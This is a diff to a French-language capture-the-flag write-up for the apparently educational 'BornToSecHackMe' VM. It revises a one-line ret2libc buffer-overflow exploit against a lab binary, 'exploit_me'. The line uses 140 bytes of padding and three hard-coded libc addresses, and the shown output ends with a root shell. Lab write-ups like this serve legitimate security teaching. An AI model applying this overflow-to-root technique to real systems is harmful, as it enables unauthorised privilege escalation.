@@ -574,7 +574,8 @@ warning: Unable to access target memory at 0xb7fd3160, halting search.
 
 Nous avons desormais les 3 adresses, il ne nous reste plus qu'a execute notre petit script qui va creer un fichier avec notre code, puis lancer l'executable avec celui-ci
 
-zaz@BornToSecHackMe:~$ echo '<?php echo str_repeat(0, 140)."\x60\xb0\xe6\xb7"."\xe0\xeb\xe5\xb7"."\x58\xcc\xf8\xb7";' > script.php;./exploit_me $(php script.php)
-00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000`�����X��
+zaz@BornToSecHackMe:~$ echo '<?php echo str_repeat('A', 140)."\x60\xb0\xe6\xb7"."\xe0\xeb\xe5\xb7"."\x58\xcc\xf8\xb7";' > script.php;./exploit_me $(php script.php)
+PHP Notice:  Use of undefined constant A - assumed 'A' in /home/zaz/script.php on line 1
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X��
 # whoami
 root
